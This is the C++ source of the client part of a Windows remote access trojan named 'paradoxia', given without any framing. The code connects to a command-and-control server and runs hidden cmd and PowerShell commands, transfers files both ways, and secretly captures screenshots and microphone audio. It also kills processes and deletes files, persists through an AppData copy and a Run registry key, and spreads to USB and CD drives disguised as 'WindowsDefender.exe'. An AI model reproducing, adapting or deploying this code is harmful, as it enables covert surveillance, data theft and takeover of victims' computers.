#include "client.h"

void createFiles(const char* bckdoorPath, const char* usbPathDest){
    std::ifstream  src(bckdoorPath, std::ios::binary);
    std::ofstream  dst(usbPathDest, std::ios::binary);
    dst << src.rdbuf();
}

DWORD WINAPI USB_INJECT(LPVOID lpParameter){
	paradoxia PX;
    char user[UNLEN + 1];
    DWORD length = UNLEN + 1;
    DWORD mxpath = MAX_PATH;
    char logicalDrives[mxpath];
    char* oneDrive;
    UINT uRes;
    DWORD cdcheck;
    DWORD usbCheck;
    std::ostringstream fpath;
    while(true){
        DWORD dwResult = GetLogicalDriveStrings(mxpath, logicalDrives);
        if(dwResult > 0 && dwResult <= MAX_PATH){
            oneDrive = logicalDrives;
            while(*oneDrive){
                oneDrive += strlen(oneDrive) + 1;
                uRes = GetDriveTypeA(oneDrive);
                fpath.clear();
                fpath.str("");
                fpath << oneDrive << "WindowsDefender.exe";
                if(uRes == DRIVE_REMOVABLE){
                    std::ifstream check(fpath.str().c_str()); // C const char 
                    if(!check.is_open()){
                        createFiles(PX.BOTLocation().c_str(), fpath.str().c_str());
                    }                     
                } else if(uRes == DRIVE_CDROM){
                    cdcheck = GetFileAttributesA(oneDrive);
                    if(cdcheck != INVALID_FILE_ATTRIBUTES){
                        createFiles(PX.BOTLocation().c_str(), fpath.str().c_str());
                    } 
                    
                }
            }
            Sleep(1000);
        }
    }
}

bool paradoxia::USBTHREADSTATUS(){
	DWORD result = WaitForSingleObject( hThread, 0);
	if (result == WAIT_OBJECT_0) {
		return false;
	}
	else {
		return true;
	}
}

void paradoxia::REConnect()
{
    Sleep(SLEEP_INTERVAL);
    closesocket(sockfd);
    WSACleanup();
    C2Connect();
}

void paradoxia::WANIP()
{
	HINTERNET hInternet, hFile;
	DWORD rSize;
	if(InternetCheckConnection("http://www.google.com", 1, 0)){
		memset(wanip, '\0', BUFFER);
		hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		hFile = InternetOpenUrl(hInternet, _T("http://bot.whatismyipaddress.com/"), NULL, 0, INTERNET_FLAG_RELOAD, 0);
		InternetReadFile(hFile, &wanip, sizeof(wanip), &rSize);
		wanip[rSize] = '\0';

		InternetCloseHandle(hFile);
		InternetCloseHandle(hInternet);
	} else {
		memset(wanip, '\0', BUFFER);
		snprintf(wanip, BUFFER, "No Internet Detected");
	}
}


void paradoxia::SendStr(const char * data) {
	int totalsent = 0;
	int lerror = WSAGetLastError();
	int buflen = strlen(data);
	while (buflen > totalsent) {
		int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
		if (lerror == WSAECONNRESET)
		{
			connected = false;
		}
		if (r < 0) return;
		totalsent += r;
	}
	return;
}

void paradoxia::C2Connect()
{
    while (true)
	{
		WSADATA wsa;
		DWORD timeout = 1000;
		if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { return; };
		sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
		{
			REConnect();
		}
        // Add one second timeout to Receive function.
		setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

		server.sin_addr.s_addr = inet_addr(SERVER_HOST);
		server.sin_port = htons(SERVER_PORT);
		server.sin_family = AF_INET;

		do {
			if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
				REConnect();
			}
			else {
				connected = true;
			}
		} while (!connected); 

		TALK();
	}
}

void paradoxia::TALK()
{
    while(connected)
    {

        memset(password_buf, '\0', MAX_PASSWORD);
		if(strlen(password_buf) <= 0)
		{
			int pass = recv(sockfd, password_buf, MAX_PASSWORD, 0);
			std::string cmpMe(password_buf);
			if(strcmp(cmpMe.c_str(), PASSWORD) == 0) {
				authenticated = true; 
				SendStr("Password Accepted.");
			}
			else { 
				SendStr("INCORRECT PASSWORD.");
				connected = false; 
				break; 
			}
		}

        while(connected && authenticated)
        {
            memset(recvbuf, '\0', BUFFER);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = false;
            }

            std::string command(recvbuf);
            
            // Receive File From server
            if(command == "freceive")
            {
                // Receive Filename
                int fsize, l = 0;
                std::ostringstream response;
                memset(temporary_buffer, '\0', BUFFER);
                memset(recvbuf, '\0', BUFFER);
                int fl = recv(sockfd, recvbuf, BUFFER, 0);
                if (fl == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = false;
                }
                snprintf(temporary_buffer, 200, "%s", recvbuf);
                //===================================================
                std::ifstream check;
                std::ofstream File(recvbuf, std::ios::app | std::ios::binary);
                // Recevie File
                while ((fsize = recv(sockfd, recvbuf + l, sizeof(recvbuf) - l, 0)) > 0)
                {
                    File.write(recvbuf, sizeof(recvbuf));
                }
                File.close();

                response.clear(); response.str(""); 
                check.open(temporary_buffer, std::ifstream::ate | std::ifstream::binary);
                if(check.is_open()){
                    response << "Saved : '" << temporary_buffer << "'\nLocation : " << cDir() << "\nFile Size : '" << check.tellg() << "' bytes.";
                    SendStr(response.str().c_str());
                } else {
                    response << "Unknown Error! File was received but cannot be found or opened! (Error Code : " << GetLastError() << ")";
                    SendStr(response.str().c_str());
                }
                
                check.close();
            }
            // Send File to Server
            else if(command == "fupload")
            {
                // Receive Filename
                FILE * fs; 
                //int filesize;
                char trigger[200];
                memset(recvbuf, '\0', BUFFER);
                int fl = recv(sockfd, recvbuf, BUFFER, 0);
                if (fl == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = false;
                }
                memset(temporary_buffer, '\0', BUFFER);
                memset(trigger, '\0', 200);
                snprintf(temporary_buffer, 200, "%s", recvbuf);

                //===================================================
                snprintf(trigger, 200, "savethis=%s", recvbuf);
                //===================================================
               
                if((fs = fopen(temporary_buffer, "rb")) != NULL){
                    
                    // fseek(fs, 0L, SEEK_END);
                    // filesize = ftell(fs);
                    // rewind(fs);
                    // //===================================================
                    // snprintf(trigger, 200, "savethis=%s=%i", recvbuf, filesize);
                    // //===================================================
                    SendStr(trigger);
                    char fbuffer[500];
                    memset(fbuffer, '\0', 500);
                    //size_t rret, wret;
                    int bytes_read;
                    while(!feof(fs)){
                        if((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0){
                            send(sockfd, fbuffer, bytes_read, 0);
                        } else {
                            break;
                        }
                    }
                    fclose(fs);
                } else {
                    SendStr("File not found.");
                }
            } else if(command == "wanip")
            {
                SendStr(wanip);
            } else if(command == "processors"){
                    SendStr(SYSTEMINFO(PROCESSORS).c_str());
            } else if(command == "pagesize"){
                SendStr(SYSTEMINFO(PAGESIZE).c_str());
            } else if(command == "minappaddr"){
                SendStr(SYSTEMINFO(MAXAPPADDR).c_str());
            } else if(command == "maxappaddr"){
                SendStr(SYSTEMINFO(MAXAPPADDR).c_str());
            }
            else if(command == "ramsize")
            {
                SendStr(ramsize(1).c_str());
            } else if(command == "vramsize"){
                SendStr(ramsize(0).c_str());	
            } 
            else if(command == "agent")
            {
                SendStr(BOTLocation().c_str());
            } else if(command == "userpc")
            {
                SendStr(UserPC().c_str());
            } else if(command == "os")
            {
                SendStr(OS().c_str());
            } 
            else if(command == "dir")
            {
                // Receive Directory name to change into.
                std::ostringstream rs;
                memset(recvbuf, '\0', BUFFER);
                int fl = recv(sockfd, recvbuf, BUFFER, 0);
                if (fl == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = false;
                }
                memset(temporary_buffer, '\0', BUFFER);
                snprintf(temporary_buffer, BUFFER, "%s", recvbuf);
                rs.str(""); rs.clear();
                if(changeDirectory(temporary_buffer) == DIR_CHANGE_SUCCESS) 
                {
                    rs << "Changed Directory to : " << cDir();
                    SendStr(rs.str().c_str());
                } else {
                    int lastError = GetLastError();
                    if(lastError == 1){
                        rs.str(""); rs.clear();
                        rs << "Incorrect function (1) path '" << temporary_buffer << "'";
                        SendStr(rs.str().c_str());
                    } else if(lastError == 2){
                        rs.str(""); rs.clear();
                        rs << "File or Folder not found (2) path '" << temporary_buffer << "'";
                        SendStr(rs.str().c_str());
                    } else if(lastError == 3){
                        rs.str(""); rs.clear();
                        rs << "Path not found.(3) path '" << temporary_buffer << "'";
                        SendStr(rs.str().c_str());
                    } else if(lastError == 4){
                        rs.str(""); rs.clear();
                        rs << "Cannot open file.(4) path '" << temporary_buffer << "'";
                        SendStr(rs.str().c_str());
                    } else if(lastError == 5){
                        rs.str(""); rs.clear();
                        rs << "Access Denied. (5) path '" << temporary_buffer << "'";
                        SendStr(rs.str().c_str());
                    } else {
                        rs.str(""); rs.clear();
                        rs << "Error changing directory to : " << temporary_buffer << "\nError : " << lastError;
                        SendStr(rs.str().c_str());
                    }
                        
                }
            } else if(command == "cat")
            {
                // Receive Filename
                FILE * fs;
                memset(recvbuf, '\0', BUFFER);
                int fl = recv(sockfd, recvbuf, BUFFER, 0);
                if (fl == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = false;
                }
                memset(temporary_buffer, '\0', BUFFER);
                snprintf(temporary_buffer, BUFFER, "%s", recvbuf);
                //===================================================
                // no trigger is sent
                //===================================================
                if((fs = fopen(temporary_buffer, "rb")) != NULL){
                    char fbuffer[500];
                    memset(fbuffer, '\0', 500);
                    //size_t rret, wret;
                    int bytes_read;
                    while(!feof(fs)){
                        if((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0){
                            send(sockfd, fbuffer, bytes_read, 0);
                        } else {
                            break;
                        }
                    }
                    fclose(fs);
                } else {
                    SendStr("File not found.");
                }
            } else if(command == "execute"){
                // Receive Filename to Execute
                memset(recvbuf, '\0', BUFFER);
                int fl = recv(sockfd, recvbuf, BUFFER, 0);
                if (fl == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = false;
                }
                memset(temporary_buffer, '\0', BUFFER);
                snprintf(temporary_buffer, BUFFER, "%s", recvbuf);

                ExecuteFile(temporary_buffer);
            } 
            else if(command == "cmd")
            {
                // Receive Command to execute
                memset(recvbuf, '\0', BUFFER);
                int fl = recv(sockfd, recvbuf, BUFFER, 0);
                if (fl == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = false;
                }
                memset(temporary_buffer, '\0', BUFFER);
                snprintf(temporary_buffer, BUFFER, "%s", recvbuf);

                ExecuteCMD(temporary_buffer);
            } else if(command == "powershell")
            {
                // Receive Command to execute
                memset(recvbuf, '\0', BUFFER);
                int fl = recv(sockfd, recvbuf, BUFFER, 0);
                if (fl == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = false;
                }
                memset(temporary_buffer, '\0', BUFFER);
                snprintf(temporary_buffer, BUFFER, "%s", recvbuf);

                ExecutePS(temporary_buffer);
            } else if(command == "pid")
            {
                memset(recvbuf, '\0', BUFFER);
                int fl = recv(sockfd, recvbuf, BUFFER, 0);
                if (fl == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = false;
                }
                memset(temporary_buffer, '\0', BUFFER);
                snprintf(temporary_buffer, BUFFER, "%s", recvbuf);

                std::ostringstream pidreply;
                DWORD procid = ProcessId(temporary_buffer);
                if(procid != 0){
                    pidreply.clear(); pidreply.str("");
                    pidreply << temporary_buffer << " is running at PID " << procid << ".";
                    SendStr(pidreply.str().c_str());
                } else {
                    pidreply.clear(); pidreply.str("");
                    pidreply << "Process " << temporary_buffer << " is not running on " << UserPC();
                    SendStr(pidreply.str().c_str());
                }
            } else if(command == "hostname")
            {
                SendStr(hostname);
            } 
            else if (command == "username")
            {
                SendStr(username);
            } 
            // ===================================
            // CRITICAL
            // ===================================
            else if (command == "kill")
            {
                SendStr("Disconnecting.");
                connected = false;
                break;
            }
            // ===================================
            // ^^
            // ===================================

            else if(command == "pkill"){
                std::ostringstream error_reply;
                memset(recvbuf, '\0', BUFFER);
                int fl = recv(sockfd, recvbuf, BUFFER, 0);
                if (fl == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = false;
                }
                memset(temporary_buffer, '\0', BUFFER);
                snprintf(temporary_buffer, BUFFER, "%s", recvbuf);

                error_reply.str("");
                error_reply.clear();
                HANDLE FP;
                
                DWORD procid = ProcessId(temporary_buffer);
                
                if(procid != 0){
                    FP = OpenProcess(PROCESS_ALL_ACCESS,false,procid);
                    TerminateProcess(FP, 1);
                    CloseHandle(FP);
                    error_reply << "Process '" << temporary_buffer << "' killed.";
                    SendStr(error_reply.str().c_str());
                } else {
                    error_reply.clear(); error_reply.str("");
                    error_reply << "Process " << temporary_buffer << " is not running on " << UserPC();
                    SendStr(error_reply.str().c_str());
                }
            
            }
            else if(command == "drives"){
                DWORD mxpath = MAX_PATH;
                char ld[mxpath];
                std::ostringstream drive;
                drive.clear(); drive.str("");
                DWORD dv = GetLogicalDriveStrings(mxpath, ld);
                if (dv > 0 && dv <= MAX_PATH)
                {
                    char* szSingleDrive = ld;
                    while(*szSingleDrive)
                    {
                        drive << "\n[DRIVE] " << szSingleDrive;

                        szSingleDrive += strlen(szSingleDrive) + 1;
                    }
                }
                SendStr(drive.str().c_str());
            } else if(command == "ls")
                {
                std::ostringstream files;
                std::ostringstream ftype;
                std::string strfiles;
                HANDLE hFind = FindFirstFile("*", &data);
                if(hFind != INVALID_HANDLE_VALUE){
                    do{
                        ftype << data.cFileName;
                        if(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
                            files << "\n[DIRECTORY] " << data.cFileName;
                        } else {
                            files << "\n[FILE] " << data.cFileName;
                        }
                    } while(FindNextFile(hFind, &data));

                    strfiles = "\nFiles in '" + std::string(cDir()) + "'\n=============================\n" + files.str();
                    SendStr(strfiles.c_str());
                } else {
                    SendStr("Failed to get Files in directory.\n");
                }
            } else if(command == "cdir")
            {
                SendStr(cDir());
            } else if(command == "install")
            {
                Install();
                startup();
                SendStr("Installed.");
            }
            else if(command == "delete")
            {
                memset(recvbuf, '\0', BUFFER);
                int fl = recv(sockfd, recvbuf, BUFFER, 0);
                if (fl == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = false;
                }
                memset(temporary_buffer, '\0', BUFFER);
                snprintf(temporary_buffer, BUFFER, "%s", recvbuf);
                std::ostringstream ans;
                ans.str(""); ans.clear();
                if(DeleteFile((char*)temporary_buffer) == 0){
                    ans << "Delete File Error : " << GetLastError() << "";
                    SendStr(ans.str().c_str());
                } else{
                    ans << "File '" << temporary_buffer << "' deleted from '" << cDir() << "'";
                    SendStr(ans.str().c_str());
                }
            } else if(command == "usbthread"){
                if(USBTHREADSTATUS() == false)
				{
					std::ostringstream lsterror;
					lsterror << "Thread is not running, Last Error is : " << GetLastError();
					SendStr(lsterror.str().c_str());
				} else {
					SendStr("Thread running.");
				}
            } else if(command == "screenshot")
            {
                FILE * fs; std::ostringstream ans;
                screenshot("sc.jpg");
                if((fs = fopen("sc.jpg", "rb")) != NULL){
                    SendStr("savethis=sc.jpg");
                    char fbuffer[500];
                    memset(fbuffer, '\0', 500);
                    //size_t rret, wret;
                    int bytes_read;
                    while(!feof(fs)){
                        if((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0){
                            send(sockfd, fbuffer, bytes_read, 0);
                        } else {
                            break;
                        }
                    }
                    fclose(fs);
                } else {
                    SendStr("Screenshot not taken, File not found.");
                }

                if(DeleteFile(_T("sc.jpg")) == 0){
                    ans << "Delete File Error : " << GetLastError() << "";
                    SendStr(ans.str().c_str());
                } 
            } else if(command == "micstart"){
                mciSendString(_T("open new type waveaudio alias paradoxia"), NULL, 0, NULL);
                mciSendString(_T("set paradoxia time format ms"), NULL, 0, NULL);
                mciSendString(_T("record paradoxia notify"), NULL, 0, NULL);
                SendStr("Now Recording.");
            } else if(command == "micstop"){
                FILE * fs; std::ostringstream ans;
                mciSendString(_T("stop paradoxia"), NULL, 0, NULL);
                mciSendString(_T("save paradoxia aud.wav"), NULL, 0, NULL);
                mciSendString(_T("close paradoxia"), NULL, 0, NULL);
                if((fs = fopen("aud.wav", "rb")) != NULL){
                    SendStr("savethis=aud.wav");
                    char fbuffer[500];
                    memset(fbuffer, '\0', 500);
                    //size_t rret, wret;
                    int bytes_read;
                    while(!feof(fs)){
                        if((bytes_read = fread(&fbuffer, 1, 500, fs)) > 0){
                            send(sockfd, fbuffer, bytes_read, 0);
                        } else {
                            break;
                        }
                    }
                    fclose(fs);
                } else {
                    SendStr("Audio Record Error. File not found.");
                }

                if(DeleteFile(_T("aud.wav")) == 0){
                    ans << "Delete File Error : " << GetLastError() << "";
                    SendStr(ans.str().c_str());
                } 
            } 
        }
    } 

    if(!connected){
        REConnect();
    }
   
}

void paradoxia::screenshot(std::string file){
	ULONG_PTR gdiplustoken;
	Gdiplus::GdiplusStartupInput gdistartupinput;
	Gdiplus::GdiplusStartupOutput gdistartupoutput;

	gdistartupinput.SuppressBackgroundThread = true;
	GdiplusStartup(& gdiplustoken,& gdistartupinput,& gdistartupoutput); //start GDI+

	HDC dc=GetDC(GetDesktopWindow());//get desktop content
	HDC dc2 = CreateCompatibleDC(dc);	 //copy context

	RECT rc0kno;

	GetClientRect(GetDesktopWindow(),&rc0kno);// get desktop size;
	int w = rc0kno.right-rc0kno.left;//width
	int h = rc0kno.bottom-rc0kno.top;//height

	HBITMAP hbitmap = CreateCompatibleBitmap(dc,w,h);//create bitmap
	HBITMAP holdbitmap = (HBITMAP) SelectObject(dc2,hbitmap);

	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);//copy pixel from pulpit to bitmap
	Gdiplus::Bitmap* bm= new Gdiplus::Bitmap(hbitmap,NULL);

	UINT num;
	UINT size;

	Gdiplus::ImageCodecInfo *imagecodecinfo;
	Gdiplus::GetImageEncodersSize(&num,&size); //get count of codec

	imagecodecinfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
	Gdiplus::GetImageEncoders (num,size,imagecodecinfo);//get codec

	CLSID clsidEncoder;

	for(int i=0; i < num; i++)
	{
		if(wcscmp(imagecodecinfo[i].MimeType,L"image/jpeg")==0)
			clsidEncoder = imagecodecinfo[i].Clsid;//get jpeg codec id

	}

	free(imagecodecinfo);

	std::wstring ws;
	ws.assign(file.begin(),file.end());//sring to std::wstring
	bm->Save(ws.c_str(),& clsidEncoder, NULL); //save in jpeg format
	SelectObject(dc2,holdbitmap);//Release Objects
	DeleteObject(dc2);
	DeleteObject(hbitmap);

	ReleaseDC(GetDesktopWindow(),dc);
	Gdiplus::GdiplusShutdown(gdiplustoken);

}

void paradoxia::Install()
{
    char user[UNLEN + 1];
    DWORD length = UNLEN + 1;
    GetUserNameA(user, &length);
    std::ostringstream copyPath;
    std::ostringstream instalLoc;
    instalLoc << "C:\\Users\\" << user << "\\AppData\\Roaming\\winparadoxia";
    CreateDirectoryA(instalLoc.str().c_str(), NULL);
    copyPath << "C:\\Users\\" << user << "\\AppData\\Roaming\\winparadoxia\\WindowsParadoxia.exe"; 
    std::ifstream  src(BOTLocation().c_str(), std::ios::binary);
    std::ofstream  dst(copyPath.str().c_str(), std::ios::binary);
    dst << src.rdbuf();
}

void paradoxia::startup()
{
	HKEY NewVal;
	wchar_t wusername[UNLEN +1];
	std::wstringstream pth;
    if (GetUserNameW(wusername, &len)) {
		std::wstring wstrusername(wusername);
		pth << L"C:\\Users\\" << wstrusername << L"\\AppData\\Roaming\\winparadoxia\\WindowsParadoxia.exe"; 
    }
	std::wstring filepath = pth.str();
	RegOpenKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &NewVal);
	RegSetValueExW(NewVal, L"winparadoxia", 0, REG_SZ, (BYTE*)filepath.c_str(), (filepath.size()+1) * sizeof(wchar_t));
	RegCloseKey(NewVal);
}


std::string paradoxia::OS()
{
	std::string os;
	std::ostringstream ds;
	int ret = 0.0;
	NTSTATUS(WINAPI *RtlGetVersion)(LPOSVERSIONINFOEXW);
	OSVERSIONINFOEXW osInfo;

	*reinterpret_cast<FARPROC*>(&RtlGetVersion) = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

	if (nullptr != RtlGetVersion)
	{
		osInfo.dwOSVersionInfoSize = sizeof osInfo;
		RtlGetVersion(&osInfo);
		ret = osInfo.dwMajorVersion;
	}

	int mw = osInfo.dwMinorVersion;
	if(ret == 5){
		switch (mw)
		{
		case 0:
			// 5.0 = Windows 2000
			os = "Windows 2000";
			break;
		case 1:
			// 5.1 = Windows XP
			os = "Windows XP";
			break;
		
		case 2:
			os = "Windows XP Professional";
			break;
		
		default:
			ds.str(""); ds.clear(); 
			ds << "Windows " << mw;
			os = ds.str();
			break;
		}
	} else if(ret == 6){
		switch (mw)
		{
		case 0:
			os = "Windows Vista";
			break;
		case 1:
			os = "Windows 7";
			break;
		case 2:
			os = "Windows 8";
			break;
		case 3:
			os = "Windows 8.1";
			break;
		
		default:
			ds.str(""); ds.clear(); 
			ds << "Windows " << mw;
			os = ds.str();
			break;
		}
	} else if(ret == 10){
			os = "Windows 10";
	} else {
		ds.str(""); ds.clear(); 
		ds << "Windows " << mw;
		os = ds.str();
	}
	return os;
}

DWORD paradoxia::ProcessId(LPCTSTR ProcessName)
{
    PROCESSENTRY32 pt;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pt.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hsnap, &pt)) { 
        do {
            if (!lstrcmpi(pt.szExeFile, ProcessName)) {
                CloseHandle(hsnap);
                return pt.th32ProcessID;
            }
        } while (Process32Next(hsnap, &pt));
    }
    CloseHandle(hsnap); 
    return 0;
}


void paradoxia::ExecutePS(char* toExecute)
{
	std::ostringstream error_reply;
	PROCESS_INFORMATION pinfo; 
	STARTUPINFO sinfo; 
	char buf[500];
	memset(buf, '\0', 500);
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	snprintf(buf, 500, "powershell.exe %s", toExecute);
	if(!CreateProcess(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
		error_reply.str("");
		error_reply.clear();
		error_reply << "Powershell Command '" << buf << "' was not executed.\nCreate Process Error Code : " << GetLastError();
		SendStr(error_reply.str().c_str()); 
	} else {
        WaitForSingleObject(pinfo.hProcess, 5000);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
		SendStr("Powershell Command Executed.");
	}
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}

void paradoxia::ExecuteCMD(char* toExecute)
{
	std::ostringstream rply;
	PROCESS_INFORMATION pinfo; 
	STARTUPINFO sinfo; 
    FILE * ans;
	char buf[500];
	memset(buf, '\0', 500);
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	snprintf(buf, 500, "cmd.exe /c %s", toExecute);
	if(!CreateProcess(NULL, buf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo))
    {
        rply.str(""); rply.clear(); 
        rply << "Error : " << GetLastError();
        SendStr(rply.str().c_str());
		
	} else {
        WaitForSingleObject(pinfo.hProcess, 5000);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
        SendStr("Command Executed Sucessfully.");
	}
}

void paradoxia::ExecuteFile(char* filename)
{
	std::ostringstream reply;
	PROCESS_INFORMATION pinfo; 
	STARTUPINFO sinfo; 
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
    reply.str("");
	reply.clear();
	if(!CreateProcess((LPCSTR)filename, NULL, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
		reply << "Create Process Error Code : " << GetLastError();
		SendStr(reply.str().c_str()); 
	} else {
        reply << "Executed '" << filename << "' on " << UserPC() << " successfully.";
		SendStr(reply.str().c_str());
	}

	CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
}

int paradoxia::changeDirectory(char* to)
{
    if(SetCurrentDirectoryA(to) != 0)
    {
        return DIR_CHANGE_SUCCESS; 
    }
}

char* paradoxia::cDir()
{
    static char DIR[MAX_PATH];
    memset(DIR, '\0', MAX_PATH);
    GetCurrentDirectory(MAX_PATH, DIR);
    return (char*)DIR;
}

std::string paradoxia::ramsize(int mode)
{
	std::ostringstream rm;
	std::ostringstream vrm;
	std::string RAM, vRAM;
	MEMORYSTATUSEX memstatx;
	memstatx.dwLength = sizeof(memstatx);
	GlobalMemoryStatusEx(&memstatx);
	float ramsize = memstatx.ullTotalPhys / (1024 * 1024);
	float memVrsize = memstatx.ullTotalVirtual / (1024 * 1024);
	rm << ramsize;
	vrm << memVrsize;
	vRAM = vrm.str();
	RAM = rm.str();
	if(mode == 1){
		return RAM;
	} else{
		return vRAM;
	}
}

std::string paradoxia::BOTLocation()
{
	std::string filelocation;
    std::ostringstream err;
	int fpath = GetModuleFileName(NULL, DIR, MAX_PATH);
	if (fpath == 0)
	{
        err.str(""); err.clear();
		err << "Failed to get : " << GetLastError();
        filelocation = err.str();
	}
	else {
		filelocation = DIR;
	}

	return filelocation;

}

std::string paradoxia::UserPC()
{
	std::string userpc;
	GetUserNameA(username, &len);
	GetComputerNameA(hostname, &hlen);
	userpc = std::string(username) + " / " + std::string(hostname);
	return userpc;
}

std::string paradoxia::SYSTEMINFO(int mode){
    SYSTEM_INFO info;
    GetSystemInfo(&info);
    std::ostringstream rbuf;
    switch (mode)
    {
    case PROCESSORS:
        rbuf.str("");
        rbuf.clear();
        rbuf << info.dwNumberOfProcessors;
        return rbuf.str();
        break;

    case PAGESIZE:
        rbuf.str("");
        rbuf.clear();
        rbuf << info.dwPageSize;
        return rbuf.str();
        break;

    case MINAPPADDR:
        rbuf.str("");
        rbuf.clear();
        rbuf << info.lpMinimumApplicationAddress;
        return rbuf.str();
        break;

    case MAXAPPADDR:
        rbuf.str("");
        rbuf.clear();
        rbuf << info.lpMaximumApplicationAddress;
        return rbuf.str();
        break;
        
    default:
        break;
    }
}